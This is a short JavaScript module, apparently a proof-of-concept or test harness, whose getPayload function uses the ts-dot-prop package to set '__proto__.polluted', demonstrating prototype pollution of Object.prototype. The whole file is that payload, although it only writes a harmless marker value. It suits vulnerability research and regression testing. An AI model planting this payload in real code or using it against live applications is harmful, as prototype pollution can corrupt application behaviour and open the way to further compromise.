function getPayload() {
    const tsDot = require("ts-dot-prop");

    let obj = {};
    tsDot.set(obj, "__proto__.polluted", "yes");
    return { obj };
}

module.exports = { getPayload };